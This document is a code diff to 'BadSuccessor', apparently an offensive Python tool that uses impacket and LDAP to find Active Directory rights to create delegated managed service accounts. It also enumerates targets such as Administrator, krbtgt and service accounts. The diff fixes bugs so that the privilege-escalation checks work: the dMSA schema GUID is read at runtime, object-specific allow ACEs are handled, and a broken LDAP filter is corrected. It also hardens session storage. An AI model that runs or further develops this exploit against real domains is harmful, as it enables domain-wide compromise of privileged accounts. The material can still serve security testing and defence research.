@@ -28,7 +28,6 @@ import shutil
 import uuid
 import random
 import string
-import pickle
 import csv
 from pathlib import Path
 
@@ -60,14 +59,18 @@ try:
     from impacket.smbconnection import SMBConnection
     from impacket.ldap import ldaptypes
 
-    # Version check
-    import pkg_resources
+    # Version check. pkg_resources was removed from the stdlib-adjacent
+    # setuptools default and is gone on Python 3.12+, so use importlib.metadata.
     try:
-        impacket_version = pkg_resources.get_distribution("impacket").version
-        if impacket_version != REQUIRED_IMPACKET_VERSION:
-            print(f"Warning: impacket version {impacket_version} detected. Tested with {REQUIRED_IMPACKET_VERSION}")
-            print("Some features may not work as expected. Consider using: pip3 install impacket==0.12.0")
-    except:
+        from importlib.metadata import version as _dist_version, PackageNotFoundError
+        try:
+            impacket_version = _dist_version("impacket")
+            if impacket_version != REQUIRED_IMPACKET_VERSION:
+                print(f"Warning: impacket version {impacket_version} detected. Tested with {REQUIRED_IMPACKET_VERSION}")
+                print("Some features may not work as expected. Consider using: pip3 install impacket==0.12.0")
+        except PackageNotFoundError:
+            print(f"Warning: Could not determine impacket version. Tested with {REQUIRED_IMPACKET_VERSION}")
+    except Exception:
         print(f"Warning: Could not determine impacket version. Tested with {REQUIRED_IMPACKET_VERSION}")
 
 except ImportError as e:
@@ -115,6 +118,20 @@ class KerbDmsaKeyPackage(univ.Sequence):
             implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 1)))
     )
 
+def guid_bytes_to_string(data):
+    """Convert an ACE ObjectType GUID (little-endian bytes) to canonical form.
+
+    Replaces impacket's old ldaptypes.bin_to_string, which no longer exists.
+    Returns None when the bytes are not a 16-byte GUID.
+    """
+    try:
+        if data is None or len(data) != 16:
+            return None
+        return str(uuid.UUID(bytes_le=bytes(data)))
+    except (ValueError, TypeError):
+        return None
+
+
 class Colors:
     """ANSI color codes for terminal output"""
     RED = '\033[91m'
@@ -131,16 +148,32 @@ class Colors:
 class SessionManager:
     """Manage session state for resumption and cleanup"""
 
-    def __init__(self, session_dir="/tmp/.badsuccessor_sessions"):
+    def __init__(self, session_dir=None):
+        # Default to a per-user directory, not a world-shared /tmp path, so one
+        # user cannot plant or read another user's session files.
+        if session_dir is None:
+            base = os.environ.get("XDG_STATE_HOME") or os.path.expanduser("~/.local/state")
+            session_dir = os.path.join(base, "badsuccessor", "sessions")
         self.session_dir = Path(session_dir)
-        self.session_dir.mkdir(exist_ok=True, mode=0o700)
+        self.session_dir.mkdir(parents=True, exist_ok=True)
+        try:
+            os.chmod(self.session_dir, 0o700)
+        except OSError:
+            pass
         self.session_id = None
         self.session_file = None
         self.state = {}
 
+    def _sanitize_id(self, session_id):
+        """Reject path separators so a session id cannot escape the session dir."""
+        if not session_id or "/" in session_id or "\\" in session_id or session_id in (".", ".."):
+            raise ValueError(f"Invalid session id: {session_id!r}")
+        return session_id
+
     def new_session(self, domain, username):
         """Create a new session"""
-        self.session_id = f"{domain}_{username}_{int(time.time())}_{uuid.uuid4().hex[:8]}"
+        safe = re.sub(r"[^A-Za-z0-9._-]", "_", f"{domain}_{username}")
+        self.session_id = f"{safe}_{int(time.time())}_{uuid.uuid4().hex[:8]}"
         self.session_file = self.session_dir / f"{self.session_id}.session"
         self.state = {
             'session_id': self.session_id,
@@ -157,19 +190,21 @@ class SessionManager:
 
     def load_session(self, session_id):
         """Load an existing session"""
-        self.session_id = session_id
-        self.session_file = self.session_dir / f"{session_id}.session"
+        self.session_id = self._sanitize_id(session_id)
+        self.session_file = self.session_dir / f"{self.session_id}.session"
         if self.session_file.exists():
-            with open(self.session_file, 'rb') as f:
-                self.state = pickle.load(f)
+            with open(self.session_file, 'r', encoding='utf-8') as f:
+                self.state = json.load(f)
             return True
         return False
 
     def save(self):
-        """Save current session state"""
+        """Save current session state as JSON (not pickle: session files live
+        on disk and must never be able to execute code when loaded)."""
         if self.session_file:
-            with open(self.session_file, 'wb') as f:
-                pickle.dump(self.state, f)
+            fd = os.open(self.session_file, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+            with os.fdopen(fd, 'w', encoding='utf-8') as f:
+                json.dump(self.state, f, indent=2, default=str)
 
     def add_created_dmsa(self, dmsa_dn, dmsa_name, ou_dn):
         """Track created dMSA for cleanup"""
@@ -193,8 +228,8 @@ class SessionManager:
         sessions = []
         for session_file in self.session_dir.glob("*.session"):
             try:
-                with open(session_file, 'rb') as f:
-                    state = pickle.load(f)
+                with open(session_file, 'r', encoding='utf-8') as f:
+                    state = json.load(f)
                 sessions.append({
                     'id': state['session_id'],
                     'created': state['created'],
@@ -242,6 +277,7 @@ class SchemaDetector:
         self.domain_dn = domain_dn
         self.schema_dn = f"CN=Schema,CN=Configuration,{domain_dn}"
         self.detected_attributes = {}
+        self.dmsa_schema_guid = None
 
     def detect_schema_attributes(self):
         """Detect which attribute variations are present in the schema"""
@@ -286,15 +322,28 @@ class SchemaDetector:
             return False
 
     def _check_class_exists(self, class_name):
-        """Check if a class exists in the schema"""
+        """Check if a class exists in the schema, and capture its schemaIDGUID.
+
+        The schemaIDGUID is what appears in an object ACE's ObjectType, so the
+        ACL checker uses it to recognise a 'create dMSA' grant exactly instead
+        of relying on a hard-coded GUID that varies between sources.
+        """
         try:
             search_filter = f"(&(objectClass=classSchema)(|(cn={class_name})(lDAPDisplayName={class_name})))"
             self.connection.search(
                 search_base=self.schema_dn,
                 search_filter=search_filter,
-                attributes=['cn', 'lDAPDisplayName']
+                attributes=['cn', 'lDAPDisplayName', 'schemaIDGUID']
             )
-            return len(self.connection.entries) > 0
+            if not self.connection.entries:
+                return False
+            entry = self.connection.entries[0]
+            if hasattr(entry, 'schemaIDGUID') and entry.schemaIDGUID:
+                try:
+                    self.dmsa_schema_guid = guid_bytes_to_string(entry.schemaIDGUID.raw_values[0])
+                except Exception:
+                    pass
+            return True
         except:
             return False
 
@@ -327,8 +376,12 @@ class ACLPermissionChecker:
     ADS_RIGHT_GENERIC_WRITE = 0x40000000
     ADS_RIGHT_GENERIC_READ = 0x80000000
 
-    # Well-known object GUIDs
-    DMSA_SCHEMA_GUID = "7b8b558a-93a5-4af7-adca-c017e67f1057"
+    # Well-known object GUIDs. The dMSA value is the schemaIDGUID of the
+    # msDS-DelegatedManagedServiceAccount class (per Tarlogic's PoC); it is a
+    # fallback only, since the real GUID is read from the schema at runtime.
+    # The previous code used the gMSA GUID for both, so it never matched a
+    # dMSA-specific create-child ACE.
+    DMSA_SCHEMA_GUID = "0feb936f-47b3-49f2-9386-1dedc2c23765"
     GMSA_SCHEMA_GUID = "7b8b558a-93a5-4af7-adca-c017e67f1057"
     COMPUTER_SCHEMA_GUID = "bf967a86-0de6-11d0-a285-00aa003049e2"
     ALL_OBJECTS_GUID = "00000000-0000-0000-0000-000000000000"
@@ -344,10 +397,13 @@ class ACLPermissionChecker:
     EXCLUDED_SIDS_SUFFIXES = ["-512", "-519"]
     EXCLUDED_SIDS = ["S-1-5-32-544", "S-1-5-18"]
 
-    def __init__(self, connection, user_sid, username):
+    def __init__(self, connection, user_sid, username, dmsa_schema_guid=None):
         self.connection = connection
         self.user_sid = user_sid
         self.username = username
+        # schemaIDGUID of the dMSA class; set from the live schema when known,
+        # otherwise the class constant.
+        self.dmsa_schema_guid = (dmsa_schema_guid or self.DMSA_SCHEMA_GUID).lower()
         self.domain_dn = self._get_domain_dn()
         self.domain_sid = self._get_domain_sid()
         self.user_groups = self._get_user_groups()
@@ -458,19 +514,38 @@ class ACLPermissionChecker:
             'write_owner': False
         }
 
-        if ace['AceType'] != ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE:
+        # Both plain (type 0) and object-specific (type 5) allow ACEs grant
+        # rights. The BadSuccessor primitive - CreateChild scoped to the dMSA
+        # class - is an ACCESS_ALLOWED_OBJECT_ACE, so the old code (which only
+        # accepted type 0) never saw it.
+        allowed_types = (
+            ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE,
+            ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE,
+        )
+        if ace['AceType'] not in allowed_types:
             return permissions
 
-        mask = int(ace['Ace']['Mask']['Mask'])
+        inner = ace['Ace']
+        mask = int(inner['Mask']['Mask'])
+
+        # For an object ACE, ObjectType is present only when the flag is set.
+        # When absent, the right applies to all child object types.
+        object_type = None
+        object_type_present = False
+        if ace['AceType'] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
+            flags = int(inner['Flags'])
+            if flags & ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT:
+                object_type_present = True
+                object_type = guid_bytes_to_string(inner['ObjectType'])
+                object_type = object_type.lower() if object_type else None
 
         if mask & self.ADS_RIGHT_DS_CREATE_CHILD:
             permissions['create_child'] = True
 
-            if hasattr(ace['Ace'], 'ObjectType'):
-                object_type = ldaptypes.bin_to_string(ace['Ace']['ObjectType']).lower()
-                if object_type == self.DMSA_SCHEMA_GUID.lower() or object_type == self.ALL_OBJECTS_GUID:
-                    permissions['create_dmsa'] = True
-            else:
+            if not object_type_present:
+                # Create-child for all classes, or a non-object ACE: covers dMSA.
+                permissions['create_dmsa'] = True
+            elif object_type in (self.dmsa_schema_guid, self.ALL_OBJECTS_GUID):
                 permissions['create_dmsa'] = True
 
         if mask & self.ADS_RIGHT_DS_WRITE_PROP:
@@ -1217,6 +1292,12 @@ class BadSuccessor:
 
         # Detect schema attributes
         schema_results = self.schema_detector.detect_schema_attributes()
+
+        # Feed the real dMSA schemaIDGUID to the ACL checker so object ACEs are
+        # matched against the value this forest actually uses.
+        if self.acl_checker and self.schema_detector.dmsa_schema_guid:
+            self.acl_checker.dmsa_schema_guid = self.schema_detector.dmsa_schema_guid.lower()
+            self.log(f"dMSA schemaIDGUID: {self.schema_detector.dmsa_schema_guid}", "INFO")
 
         if schema_results['supported']:
             self.log("Full Windows Server 2025 dMSA schema detected!", "SUCCESS")
@@ -1965,7 +2046,9 @@ class BadSuccessor:
         targets["Built-in Accounts"] = ["Administrator", "krbtgt"]
 
         self.log("\nEnumerating service accounts...", "INFO")
-        svc_filter = "(|(&(objectClass=user)(sAMAccountName=svc*))(& (objectClass=user)(sAMAccountName=srv*))(& (objectClass=user)(sAMAccountName=service*)))"
+        # No spaces after '&': RFC 4515 filters reject them and AD errors out,
+        # which previously made this whole service-account sweep fail.
+        svc_filter = "(&(objectClass=user)(|(sAMAccountName=svc*)(sAMAccountName=srv*)(sAMAccountName=service*)))"
         self.connection.search(
             search_base=self.domain_dn,
             search_filter=svc_filter,
